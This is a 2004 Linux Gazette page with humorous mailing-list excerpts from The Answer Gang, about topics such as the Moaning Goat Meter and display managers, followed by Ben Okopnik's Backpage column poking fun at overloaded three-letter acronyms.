<h3>Iraq-related Irony</h3>
<blockquote><em>
Ben forwarded this e-mail from Gene Spafford. (The story referred to may be 
read <a href="http://www.theregister.co.uk/2004/06/23/guantanamo_worster/">here</a>,
if you are confused by this, you can read <a href="http://en.wikipedia.org/wiki/The_Trial">this</a> 
or <a href="http://www.gutenberg.net/etext05/ktria11.txt">this</a>).
</em></blockquote>
<p>
It appears that the US navy spokesman put up to answer journalists'
questions about the US detention centre at Guantanamo Bay, Cuba, is one
Lieutenant Mike Kafka.

<p>
As the article in The Register (http://www.theregister.co.uk) observes: "Yes,
you're reading that correctly. A man named Kafka has been deployed to field
questions about a prison where the criminals are only vaguely charged with
crimes, can't speak to lawyers and likely will never get out." Any
resemblance this reality bears to an actual fiction is entirely
coincidental.

<hr width="80%">
<a name="sublime"></a>
<h3>Subliminal advertising</h3>

<p>
<strong>[Brian]</strong>
<pre>
Kapil Hari Paranjape wrote:
| I asusme you are really Debianized. So quoting from
    ^^^^^^
</pre>

<p>
Subliminal advertising for a motherboard manufacturer. Excellent use
within a text email.

<p>
<strong>[Ben]</strong>
Yes, but it's not as effective as it could be; it's missing the 
<br>
<pre>
&lt;blink duty_cycle=&quot;0.01%&quot;&gt;&lt;/blink&gt;
</pre>
tags.


<hr width="80%">
<a name="context"></a>
<h3>Context</h3>
<p>
<strong>[Thomas]</strong>
Do not take this e-mail out of context.

<p>
<strong>[Rick]</strong>
Hmm, now how can I best abuse that quotation in a .signature block?

<p>
<strong>[Thomas]</strong>
I suppose in a way, if you do, you've then broken the meaning of it. <img 
alt=":))" src="../gx/dennis/smily.gif" width="20" height="24">
hehehe

<hr width="80%">
<a name="mgm"></a>
<h3>Moaning Goat</h3>
<blockquote><em>
I found this so entertaining, I've put a <a 
href="misc/lg_laundrette/faq.html">copy of the MGM FAQ</a> in with this issue.
</em></blockquote>
<p>
<strong>[Rick]</strong>
Surely no desktop is complete without the Moaning Goat Meter (which used
to <strike>lurk^W</strike>reside at http://www.xiph.org/mgm/):

<blockquote>
MGM, the Moaning Goat Meter, is the ultimate sixty-ton cast iron lawn
ornament for the desktops of today's hacker set: A gorgeous, highly
configurable load and status meter written entirely in Perl. Serious
<a href="misc/lg_laundrette/villa.gif">pink-flamingo</a> territory. For evil geniuses only.
</blockquote>

<p>
<strong>[Ben]</strong>
Must... have. Feel... irresistible... urge.

<p>
<strong>[Rick]</strong>
Disclaimer:  MGM will not get your whites whiter or your colors
brighter. It will, however, sit there and look spiffy while sucking
down a major honking wad of RAM.

<p>
A review on taint.org states:  "Silly: The Moaning Goat Meter, by
xiph.org -- a load meter written in a proper[1] programming language, and
with an inexplicably spinning fish that stares at you. 

<p>
Je suis desol, desol, that the Web pages for this procmeter3-like 
(but much prettier) mostly-ornamental system-monitoring widget have
disappeared.  The FAQ in particular was priceless, not to mention the
pictures with those pink flamingos in them.

<p>
<strong>[Ben]</strong>
Therefore, all give thanks to the Wayback Machine. <i>Voila</i>:
&lt;<a href="http://web.archive.org/web/20020613175800/www.xiph.org/mgm/faq.html">http://web.archive.org/web/20020613175800/www.xiph.org/mgm/faq.html</a>&gt;

<blockquote>
<strong>[Rick]</strong>
Courtesy of which, I now have a complete mirror including functional
download link, at <a href="http://linuxmafia.com/mgm/">http://linuxmafia.com/mgm/</a> .  (I'll be writing to the
xiph.org people to make sure this is OK.)

<p>
<strong>[Ben]</strong>
Ooops, I should have mentioned "mgm-doc" earlier.

<p>
<strong>[Rick]</strong>
Actually, this has all been quite useful.

<ol>
<li>  It's good to know that the Debian Project keeps available a
late post-1.1 CVS-checkout of the upstream xiph.org tarball
(the "mgm_1.1.cvs.20020221.orig.tar.gz" link on
<a href="http://packages.debian.org/testing/doc/mgm-doc">http://packages.debian.org/testing/doc/mgm-doc</a> or
<a href="http://packages.debian.org/testing/admin/mgm">http://packages.debian.org/testing/admin/mgm</a>).  That's a better
reference copy than I had previously, so I've refreshed my tarball in
<a href="http://linuxmafia.com/pub/linux/utilities-general">http://linuxmafia.com/pub/linux/utilities-general</a> from it.
</li>

<li>  Looks like they've split the contents of that tarball into code 
and docs (packages mgm and mgm-doc), for Debian packaging purposes.
</li>

<li>  Also, package maintainer David Z. Maze took the trouble of tracking
down upstream mgm creator Christopher Montgomery and secured a licence
statement.  Previously, nobody at xiph.org had bothered to do this, so
technically it was proprietary software by default.  (I've retroactively
added Montgomery's licence-grant e-mail to my archived tarball.)
</li>
<p>
Anyhow, I'm <em>still</em> delighted to have resurrected the MGM Web pages for
the public's enjoyment.  Having them be fetchable in a Debian package is
nice to know about, but they really should be findable by the public on
the Web.  (Serendipitously, Montgomery's e-mail would seem to have
declared both the mgm and mgm-doc package to be "public domain", and
therefore also my Web-pages mirror, so I needn't ask permission for the
latter.)
</blockquote>
<p>
<strong>[Ben]</strong>
I have downloaded The Beast itself. Should you hear mad laughter, the
sound of screeching gears, and the moaning of tortured souls, it's just
me doing the installation.

<p>
<strong>[Brian]</strong>
While the version you've got via Wayback may indeed be the latest, while
the mgm pages on Xiph are gone, and all the cvs links and instructions
are borked, Moaning Goat Meter is available via Subversion from Xiph,
and/or from the web interface, direct link:

<p>
<a href="http://svn.xiph.org/tags/mgm-release-1-1/mgm/">http://svn.xiph.org/tags/mgm-release-1-1/mgm/</a>

<p>
It's not emerge-able in Gentoo, but Debian provides:

<p>
<a href="http://packages.debian.org/stable/admin/mgm">http://packages.debian.org/stable/admin/mgm</a>

<p>
I'm getting Perl errors about "width". More digging tomorrow.

<p>
<strong>[Ben]: MGM up and running</strong>
<p>
[ mad laughter, other Gene Wilder-like behavior ] The world is mine! I
shall rule, yesss my precioussss...

<p>
Ooops. Am I allowed to mix different movie plots, or are Mad
Geniuses exempt from those artificial restrictions? [sigh] Details,
details.
<p>
&lt;<a href="http://okopnik.freeshell.org/img/TheGoat.png">http://okopnik.freeshell.org/img/TheGoat.png</a>&gt;

<blockquote><em>
I mentioned these <a href="../104/lg_laundrette.html">last month</a>, but they're
worth another mention.
</em></blockquote>

<p>
<strong>[Brian]</strong>
Ben mentioned someplace in this or another thread about mixing
movies/story lines. Yeah, that rocks. See these:

<p>
Monty Python - Fellowship of the Ring
<a href="http://www.xenocorp.net/H_bardCorner/MPFOTR.htm">http://www.xenocorp.net/H_bardCorner/MPFOTR.htm</a>
<p>
Monty Python - The Two Towers
<a href="http://www.xenocorp.net/H_bardCorner/MPTTT.htm">http://www.xenocorp.net/H_bardCorner/MPTTT.htm</a>

<p>
<strong>[Jay]</strong>
Ah yes, 'Osterizer pastiche'.
<p>
Don't forget "Once more, with Hobbits":
<p>
<a href="http://www.omwh.com/">http://www.omwh.com/</a>

<hr width="80%">
<a name="esp"></a>
<h3>ESP</h3>
<p>
<strong>[Kapil]</strong>
Besides my ESP-enabled fortune signature generator has something to say
about the time I've spent on doing all this configuration... (See
below).

<p>
Regards,
<p> 
Kapil.
<pre>
-- 
If a 'train station' is where a train stops, what's a 'workstation'?
</pre>
<p>
<strong>[Ben]</strong>
Back when, Xerox clearly acknowledged this by producing what they
referred to as "Work-Less" workstations (I used to repair those things.)
Of course, we referred to them as "worthless" workstations...
<blockquote><em>[Later, in another thread...]</em></blockquote>
<p>
<strong>[Ben]</strong>
I've spent plenty of time trying to confirm this, and have not been
successful. IMO, display managers are a blight upon the land.

<p>
<strong>[Kapil]</strong>
I read this thread and am confused because "I Thought I Knew" (Know that
you do not know and you shall know---old jungle saying). This is what I
thought I knew but the thread seems to indicate otherwise!

<blockquote><em>&lt;Snip&gt;</em></blockquote>

<p>
P.S. Where does fortune derive its ESP from. (see below)
<p>
P.P.S. Great author by the way.
<pre>
--
... though his invention worked superbly -- his theory was a crock of sewage 
from beginning to end. <br>-- Vernor Vinge, "The Peace War"
</pre>

<hr width="80%">
<a name="linguini"></a>
<h3>Linguini?</h3>
<p>
<strong>[Ben]</strong>
Long Block Addressing is a method the HD controllers used to use in
order to access data in partitions greater than 504MB; Linux, Novell,
etc. are all smart enough to do their own geometry translation, and
don't need the extra help.

<p>
<strong>[Jay]</strong>
It's linguini, Ben.

<p>
<strong>[Ben]</strong>
"Linguini Block Addressing"? Are you sure, Jay? I'd have sworn... well,
you're a pretty knowledgeable kinda guy, so I guess I'll believe you.
Although I've only seen linguini clump into blocks when it was
overcooked.

<p>
<strong>[Jay]</strong>
"Logical Block Addressing".

<p>
<strong>[Ben]</strong>
[pause] WILL you make up your mind, already? There I was, getting my
fork and the spaghetti sauce, and you messed it all up again!

<p>
The problem is TMT [1].

<p>
[1] <a href="lg_backpage.html">Too Many TLAs [2].</a><br>
[2] Three-letter acronyms, of course.

<hr width="80%">
<a name="macbeth"></a>
<h3>MacBeth</h3>

<p><strong>[Neil]</strong>
Is that a 2c tip I see before me?

<p>
<strong>[Ben]</strong>
<code>"...The handle toward my hand? Come, let me clutch thee."</code>
Go ahead, Neil! I mean, just because it didn't work out too well for
Macbeth... do watch out for a moving forest, though. 

<p>
<strong>[Neil]</strong>
No problemo, I'm sure I still have a few cans of Agent Orange left in the 
shed. Those black helicopters do come with spray booms, don't they?

<p>
<strong>[Ben]</strong>
So, I guess that line should be revised to:

<p>
"Is this a gas-operated, clip-fed, air-cooled, semi-automatic M1 rifle I
see before me?"

<p>
<strong>[Neil]</strong>
Don't be so wussy, give me an Apache any day.

<p>
<strong>[Ben]</strong>
Yes, but the description would take several large volumes...

<p>
<strong>[Ben]</strong>
I don't know. It's... just not the same, somehow.

<p>
<strong>[Neil]</strong>
Well, we can at least keep in the same meter:

<p>
double_entendre="off"<br>
"is that a chopper I see before me?"

<p>
<strong>[Ben]</strong>
&lt;p style="!important double_entendre='on'"&gt;
<p>
Nope. Neither my Honda Nighthawk nor this Ninja 500 crotch-rocket they
gave me as a loaner (the shop ordered the wrong tires, so my bike sits
in pieces awaiting delivery) qualify.
<blockquote>
<strong>[Bradley]</strong>
Nit:
<p>
&lt;p style="-moz-double-entendre: on !important;"&gt;<br>
I highly doubt that anyone but Gecko will support double entendres for
Web content ;-)))))
<p>
<strong>[Ben]</strong>
Hey, there are people out there working on adding <em>smell</em> to "the
computer experience" - so you never know. Double-entendres, now, those
you have to glean from context... they become kinda pointless if you
can't.
<blockquote>
<strong>[Jay]</strong>
I'm sure by now you've heard about the woman who walked into a bar and
asked the bartender for a double entendre... so he gave it to her.
</blockquote>
<p>
<strong>[Bradley]</strong>
So it would be better then to put the style information in an external
stylesheet generated
dynamically by a PHP app? <img alt=";-)" src="../gx/dennis/smily.gif" width="20" height="24">
<p>
I wonder if smell hardware will have Linux drivers.

<p>
<strong>[Breen]</strong>
Yes, but they'll only be sensitive to herring-scent.
</blockquote>

<hr width="80%">
<p>
<strong>[Thomas]</strong>
<img alt=":-)" src="../gx/dennis/smily.gif" width="20" height="24">
The next person that replies to me off-list, without stating why it
should be, is going to get a <em>VERY</em> angry reply back from me.

<p>
<strong>[Bradley]</strong>
:-O
<p> 
I hope that wasn't me....

<p>
<strong>[Jay]</strong>
&lt;speculation basis="extensive mail system knowledge"&gt;<br>
I think Bradley is sending duplicate replies, Thomas, to you and the
list, and his mail client is neglecting to mark yours as a carbon.<br>
&lt;/speculation disclaimer="but I could be wrong"&gt;
<hr width="80%">
<a name="kgxdm"></a>
<h3>Display Managers</h3>
<p>
<strong>[Ben]</strong>
I've spent plenty of time trying to confirm this, and have not been
successful. IMO, display managers are a blight upon the land.

<p>
<strong>[Thomas]</strong>
Well, KDM and GDM are separate entities in themselves. Being the
bloated pile of jelly they are, not only do they consume the PC, but
they also like to do thing Their Way -- to the extent that GDM actually
ignores ~/.xsession . And I have no idea how the hell KDM operates --
that's just a nightmare.

<p>
<strong>[Ben]</strong>
[Nod] I was conflating the three of them, but yeah - "xdm" isn't quite
as bad as the others, and GDM has not <em>actually</em> eaten any small
children while I was watching (although I've heard rumors.) KDM, now -
that thing should not be let out on the streets, or should at least be
heavily medicated, have a transmitter strapped to its ankle, and be
continuously monitored by professionals armed with tasers and nets.

<p>
<strong>[Ben]</strong>
Mine points to "lwm", which I haven't used for years. I don't even
have the slightest idea of how it got that way.
<p>
<strong>[Thomas]</strong>
You didn't dist-upgrade from potato, did you?

<p>
<strong>[Ben]</strong>
Uh... wouldn't surprise me in the least. I go doing stuff like that
regularly behind my own back, sneaking it in before I can notice those
shenanigans. Boy, if I ever catch myself at it, I'll be in bad
trouble...

<hr width="80%">
<a name="cheer"></a>
<h3>Good Cheer</h3>

<p>
<strong>[Jay]</strong>
Different thread entirely.

<p>
<strong>[Rick]</strong>
But same underlying problem of insufficient good cheer.  Thus my point.

<p>
<strong>[Jay]</strong>
You got any good cheer you could FTP me?  :-}

<p>
<strong>[Rick]</strong>
Well, the ".mov" files (Sorenson QuickTime) inside
<a href="http://linuxmafia.com/pub/rick-moen-soundfiles/">http://linuxmafia.com/pub/rick-moen-soundfiles/</a> are candidates,
especially the toyota-bugger.mov one.

<p>
(It's an advert that ran on Austrlian television for Toyota pickup
trucks.)

<hr width="80%">
<a name="hallucinating"></a>
<h3>Hallucinating</h3>

<p>
<strong>[Thomas]</strong>
I wrote the vars in upper case. Are you sure nothing is lowercasing them
your end? 

<p>
<strong>[Ben]</strong>
[blink] Well, I'm not using Outlook (I'd <em>expect</em> that thing to rewrite
"password" as "pdonkeyword", e.g.) Nothing should have messed with them
- unless I somehow managed to do it manually in "vi", which I doubt.
<p>
If I'm hallucinating, I'm going to be highly annoyed. Just think of all
the money and time I wasted in search of getting wasted (well, in my
younger days, anyway) when all I had to do was <b>wait</b>...
<hr width="80%">
<a name="antispam"></a>
<h3>Anti-Spam?</h3>
<p>
<strong>[Thomas]</strong>
<pre>
"Lizzie" wrote:

&gt; Only Delivers The Email You Want!
</pre>
Hehehe, this suggests spam is only ever produced from people that send
out e-mails that they never intended to send. Of course, why they'd ever
waste their time doing this in the first place.....

<hr width="80%">
<p>
<strong>[Thomas]</strong>
The only thing I will say to you is
that don't always expect to submit one and see it in the preceeding
release of LG. Heather and I decide which tips get published when.

<p>
<strong>[Jay]</strong>
If you can figure out how to publish tips in an issue of LG that's
already gone out, my hat's off to you, Thomas.

<p>
<strong>[Ben]</strong>
The method is covered in Jim's "Retro" series. It's based on that
capability of Linux that Linus talked about, executing an infinite loop
in three seconds...

</p>



<!-- *** BEGIN author bio *** -->
<!-- *** END author bio *** -->




<div id="articlefooter">




<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="lg_backpage"></a>
<h1>The Backpage</h1>
<p id="by"><b>By <A HREF="../authors/okopnik.html">Ben Okopnik</A></b></p>


</b>
</p>


<p>
<p> One of the deepest problems of our much-maligned society - usually
unnoticeable due to more pressing concerns, such as "Gee, Homeland Security
just issued a Mauve-and-Puce-with-Fuchsia-stripes Threat Level
End-of-the-World Doom Warning <a
href="http://www.cockeyed.com/citizen/alert/action.html">Terror Alert</a>.
Do my socks go with that?" - is <strong><em>acronym overrun</em></strong>.
Yes indeed; for those of you who have recognized the problem but suffered
in silence for years - this is it! The Revolution is <strong>NOW!</strong>
...at least I'll explain what I mean, for those who are scratching their
heads and wondering what the heck I'm ranting about <em>this</em> time.

<p> (Curmudgeons must curmudge, at least on occasion, in order to keep
their status. Don't mind me, I'm just keeping up the membership
requirements.) 

<p> It's simple. Like the standard dotted-quad IP space in networking, the
standard and obviously far more limited TLA (three-letter acronym) space is
quickly being filled to its maximum capacity. Some have suggested that
ETLAs (the extended, or four-letter version) are the solution... do you
hear my hollow laugh? (Besides, we already <em>have</em> lots of uses for
four-letter words - especially with all these Terror Alerts.) The
population is growing, the rate of our technological expansion is just now
becoming non-linear - and we poor geeks are running around desperately
searching for three-letter abbreviations that are not totally overloaded.
Some of the definitions even conflict with each other! Consider the
following (Bowdlerized for the pleasure of the ^%(@!%$#*%^*s at the FCC,
who have <a
href="http://www.thenation.com/doc.mhtml?i=20040517&s=jarvis">redefined
"obscenity" and "indecency"</a> by making of themselves an excellent
example of both):

<style>
<!--
dd {
	font-weight: bold;
	margin-left: 0px;
	margin-top: 20px;
}
-->
</style>

<dl>
<dd>ATM
<dt>Automatic Teller Machine
<dt>Abstract Test Method
<dt>Asynchronous Transfer Mode
<dt>Adobe Type Manager
<dt>at the moment (IRC/Usenet usage)
<dd>EOD
<dt>End Of Day
<dt>End Of Discussion
<dt>Explosive Ordnance Disposal
<dd>DOA
<dt>Dead On Arrival
<dt>Dead Or Alive
<dd>FOS
<dt>Freedom Of Speech
<dt>Full Of Sh*t
<dd>IHTFP
<dt>I Hate This F*cking Place
<dt>I Have Truly Found Paradise
</dl>

(For more acronyms, abbreviations, initialisms, and other fun and funky
stuff, check out my <a
href="http://okopnik.freeshell.org/acronyms.cgi">AcroFinder</a>. Feel free
to contribute if your favorite abbrvtn is missing.)

<p> Now, I ask you. Is this right? Is this fair? Is this <em>just</em>? I
mean, what's next - <em>words</em> or even <em>phrases</em> with multiple
meanings? I'm shocked - shocked, I tell you! - by what I see in our future
if this trend continues (it's all sorta dim and fuzzy - I'm never buying
that brand of digital camera again! - but involves high prices, a desperate
lack of good beer, and people wearing 1970s-style disco clothes. [shudder])
Trust me, you don't want to go there.

<p> As an example of this, just a while ago, LG's Editor Gal and I were
discussing a problem in a production script, and ran into a snag:

<div class="irc">
<table>
<tr><td id="q">06:59 &lt; okopnik&gt;     </td><td id="t">There was a broken
'..104' in there, but not the '..issue80'.</td></tr>
<tr><td id="r">06:59 &lt;@editorgal&gt;   </td><td id="t">line number 3266. 1
mo</td></tr>
<tr><td id="q">06:59 &lt; okopnik&gt;     </td><td id="t">'K.</td></tr>
<tr><td id="r">07:00 &lt;@editorgal&gt;   </td><td id="t">missing
fencepost</td></tr>
<tr><td id="q">07:00 &lt; okopnik&gt;     </td><td id="t">I figured it was
STL.</td></tr>
<tr><td id="r">07:01 &lt;@editorgal&gt;   </td><td id="t">not your garden variety
fencepost error :D</td></tr>
<tr><td id="q">07:01 &lt; okopnik&gt;     </td><td id="t">Oh?</td></tr>
<tr><td id="r">07:01 &lt;@editorgal&gt;   </td><td id="t">line now
reads</td></tr>
<tr><td id="r">07:01 &lt;@editorgal&gt;   </td><td id="t">if ( $refdir eq "") {
$ea =~ s/=LG=/\.\.\//g; }</td></tr>
<tr><td id="q">07:01 &lt; okopnik&gt;     </td><td id="t">Banananana???
:)</td></tr>
<tr><td id="r">07:01 &lt;@editorgal&gt;   </td><td id="t">procmail folk call \/
fencepost...</td></tr>
<tr><td id="q">07:02 &lt; okopnik&gt;     </td><td id="t">Ah.</td></tr>
</table>
</div>

(Classically, a "fencepost error" in computer programming is an off-by-one
mis-count; e.g., a 100' fence with a post every 10' requires
<strong>11</strong> posts, not 10. It's often found in loops, where it's
likely to be called a "banana error" - from the story of the little girl
who said "I know how to spell 'banana', I just don't know where to stop!")

<p> So - now that you're aware of this terrible problem and are surely
unable to just sit on your hands while this terrible injustice goes on -
<em>help!</em> Dear readers, please give us your detailed opinions and
suggestions, written legibly on the back of a recently-issued postage stamp
(and remember, <strong>no toxic ink</strong>. We might want to, um, use
them or something. [<a name="back_1" href="#footnote_1">1</a>]) Send them,
along with the box-tops from your favorite cereal and a 500-word essay on
why you should be the one that NASA sends to found the colony on Hyperion,
to Uncle Louie, Box 100, Nucla CO 81424. 

<p> Better yet, send all that junk to the White House. It might confuse
them and keep'em busy long enough to stop or at least delay any further
Terror Alerts... I'm gettin' mighty tired of digging through this sock
collection.

<p style="margin-top: 75px">[<a name="footnote_1" href="#back_1">1</a>] Most 
people, when they run out of stamps, simply walk down to the local post office 
and get some. Here at LG, though, some of us are a different - and maybe even 
arguably <em>better</em> - breed of disturbed individuals... we just write an 
article and wait for the mail carrier. It's less work, and much less tedious 
than chewing through the straps besides.


<p class="sig"><img src="../gx/okopnik_sig.png" alt="B. Okopnik"></p>


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<IMG ALT="picture" SRC="../gx/authors/okopnik.jpg" align="left"  hspace="10" vspace="10" class="bio">
Ben is the Editor-in-Chief for Linux Gazette and a member of The Answer Gang.

<em>
<p>
Ben was born in Moscow, Russia in 1962. He became interested in electricity
at the tender age of six, promptly demonstrated it by sticking a fork into
a socket and starting a fire, and has been falling down technological
mineshafts ever since. He has been working with computers since the Elder
Days, when they had to be built by soldering parts onto printed circuit
boards and programs had to fit into 4k of memory. He would gladly pay good
money to any psychologist who can cure him of the recurrent nightmares.

<p>His subsequent experiences include creating software in nearly a dozen
languages, network and database maintenance during the approach of a
hurricane, and writing articles for publications ranging from sailing
magazines to technological journals. After a seven-year Atlantic/Caribbean
cruise under sail and passages up and down the East coast of the US, he is
currently anchored in St. Augustine, Florida. He works as a technical
instructor for Sun Microsystems and a private Open Source consultant/Web
developer. His current set of hobbies includes flying, yoga, martial arts,
motorcycles, writing, and Roman history; his Palm Pilot is crammed full of
alarms, many of which contain exclamation points.

<p>He has been working with Linux since 1997, and credits it with his complete
loss of interest in waging nuclear warfare on parts of the Pacific Northwest.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/okopnik.html">Ben Okopnik</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div id="navigation">

<a href="../index.html">Home</a>
<a href="../faq/index.html">FAQ</a>
<a href="../lg_index.html">Site Map</a>
<a href="../mirrors.html">Mirrors</a>
<a href="../mirrors.html">Translations</a>
<a href="../search.html">Search</a>
<a href="../archives.html">Archives</a>
<a href="../authors/index.html">Authors</a>
<a href="../contact.html">Contact Us</a>
</div>

<div id="breadcrumbs">

<a href="../index.html">Home</a> &gt;
<a href="index.html">August 2004 (#105)</a> &gt;
TWDT

</div>


<img src="../gx/tux_86x95_indexed.png" id="tux" alt="Tux"/>

<br />

</body>
</html>

